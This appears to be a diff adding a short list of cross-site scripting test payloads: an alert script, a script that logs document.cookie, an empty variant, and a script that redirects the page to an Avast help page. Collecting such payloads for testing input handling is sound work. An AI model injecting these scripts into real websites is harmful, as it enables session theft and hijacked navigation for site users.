@@ -1,0 +1,12 @@
+1. Basic xss
+TEST_XSS = <script>alert("Im a hacker");</script>
+
+2. Stolen cookie
+STOLEN_COOKIE = <script>console.log(document.cookie)</script>
+STOLEN_COOKIE_V2 = <script></script>
+
+3. Redirect_url
+REDIRECT_URL = 
+<script>
+    window.location.replace("https://businesshelp.avast.com/Content/Products/AfB_Mobile_Protection/Android/HackAlerts.htm");
+</script>
